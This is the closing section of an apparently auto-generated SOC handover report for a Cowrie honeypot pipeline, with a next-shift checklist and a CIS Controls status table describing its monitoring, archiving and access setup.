> **Report grouping:** 101 priority case(s) shown individually · 22 recon entry/entries in table (12 group(s) consolidating 39 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-21T21:16:32Z_
